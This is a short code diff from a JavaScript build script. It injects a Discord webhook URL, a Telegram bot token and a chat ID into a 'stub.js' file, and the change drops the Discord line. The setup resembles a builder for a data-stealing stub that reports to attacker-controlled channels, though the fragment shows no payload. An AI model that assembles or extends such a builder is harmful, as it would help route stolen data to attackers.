@@ -96,7 +96,6 @@ async function main() {
     const stubPath = path.resolve(__dirname, 'stub.js');
     originalStubCode = fs.readFileSync(stubPath, 'utf8'); 
     const updatedStubCode = originalStubCode 
-    .replace(/const discordWebhookUrl = 'REMPLACE_ME';/, `const discordWebhookUrl = '${webhookURL}';`)
     .replace(/const telegramBotToken = 'REPLACE_ME';/, `const telegramBotToken = '${botToken}';`)
     .replace(/const telegramChatId = 'REPLACE_ME';/, `const telegramChatId = '${chatId}';`);
 
